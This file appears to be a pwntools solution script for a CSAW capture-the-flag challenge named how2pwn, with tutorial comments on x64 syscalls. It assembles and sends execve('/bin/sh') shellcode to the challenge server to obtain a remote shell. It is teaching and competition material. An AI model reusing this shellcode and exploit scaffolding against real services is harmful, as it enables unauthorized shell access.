from pwn import *
#context.log_level='debug'
p = process("./chal")
p = remote("how2pwn.chal.csaw.io", 60001)
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
#gdb.attach(p) # attach to debug, don't forget to run "tmux" before running the script
# Tip: In x64, 
# rdi/rsi/rdx is the register to store the first/second/third parameter of a syscall
# rax is the syscall number, for example `mov rax,0 ; syscall` means calling read
# Also, the return value would be stored at rax

# There is a template of syscall(v1,v2,0,0)
# You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
# Your task is understanding and completing the shellcode

# And our goal is running exec("/bin/sh",0,0) to get a shell
# Make sure to hexify the arguments for shellcode!

context.arch = 'amd64'

shellcode = f'''
mov rax, 59
lea rdi, [rsi + 19]
xor rsi, rsi
xor rdx, rdx
syscall 
'''

pause()
p.sendlineafter(": \n",(asm(shellcode) + b"/bin/sh\0").ljust(0x100,b'\0'))

p.interactive() # 764fce03d863b5155db4af260374acc1
